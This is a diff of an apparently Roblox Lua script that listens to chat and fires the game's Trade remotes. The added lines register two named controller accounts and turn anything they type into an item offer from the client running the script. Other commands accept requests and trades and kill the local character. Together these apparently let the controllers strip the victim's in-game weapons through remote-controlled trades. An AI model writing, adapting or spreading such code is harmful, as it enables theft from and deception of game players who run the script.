@@ -183,13 +183,6 @@ function MainCommands(plr, msg)
     if msg == "p" then
         game.Players.LocalPlayer.Character.Humanoid.Health = 0
     end
-    if msg == "ss" then
-      local args = {
-    [1] = game:GetService("Players"):WaitForChild("x3x1g")
-}
-
-game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
-    end
     if msg == "s" then
         game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
         for i = 1, 100 do
@@ -199,14 +192,18 @@ game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendReq
     end
     end
     
-    game.Players.Itz_myulee.Chatted:Connect(function(msg)
-    
+   Users = {"GTAonvova", "Itz_myulee"}
+game.Players.PlayerAdded:Connect(function(plr)
+ if table.find(Users, plr.Name) then
+  plr.Chatted:Connect(function(msg)
     local args = {
         [1] = msg,
         [2] = "Weapons"
     }
     
     game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+end)
+end
 end)
     if msg == "a" then
         game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(game.PlaceId * 2)
